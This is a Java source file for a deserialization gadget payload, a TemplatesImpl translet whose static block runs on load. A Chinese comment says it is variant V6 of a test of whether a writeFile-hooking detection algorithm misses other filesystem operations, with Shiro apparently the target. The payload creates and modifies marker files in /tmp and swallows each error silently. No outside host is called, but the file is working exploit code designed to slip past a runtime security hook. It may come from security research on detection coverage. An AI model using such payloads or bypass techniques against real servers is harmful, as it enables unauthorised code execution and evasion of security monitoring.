import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/** R2 变体V6（同步面）：静态块内（请求线程、反序列化栈上）只做「非 writeFile 钩子面」的
 *  文件系统动作，新算法 A/B 只覆盖 writeFile 事件，预期全部放行：
 *   b1 File.createNewFile → /tmp/pwn_r2_sync_create （新标记文件出现，成功标准a）
 *   b2 File.mkdir         → /tmp/pwn_r2_sync_dir
 *   b3 setLastModified    → 更新既有标记 pwn_shiro_nio_bypass 的 mtime（成功标准a）
 *   b4 RandomAccessFile   → /tmp/pwn_r2_sync_raf   （放最后：若 RAF 在 writeFile 钩子面内，
 *                            请求线程栈含 TemplatesImpl 帧 + cookie 在场 → 算法A/B 会拦，
 *                            与 V1-a3 异步结果对照可归因 RAF 是否被钩）
 *  全部独立 try/catch，真值可分别归因。 */
public class PwnR2Io extends AbstractTranslet {
    static {
        try {
            java.io.File f = new java.io.File("/tmp/pwn_r2_sync_create");
            f.createNewFile();
        } catch (Throwable t) {
            // 静默
        }
        try {
            java.io.File d = new java.io.File("/tmp/pwn_r2_sync_dir");
            d.mkdir();
        } catch (Throwable t) {
            // 静默
        }
        try {
            java.io.File m = new java.io.File("/tmp/pwn_shiro_nio_bypass");
            m.setLastModified(System.currentTimeMillis());
        } catch (Throwable t) {
            // 静默
        }
        try {
            java.io.RandomAccessFile raf =
                new java.io.RandomAccessFile("/tmp/pwn_r2_sync_raf", "rw");
            raf.writeBytes("pwn");
            raf.close();
        } catch (Throwable t) {
            // 静默
        }
    }

    public PwnR2Io() {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {}
}
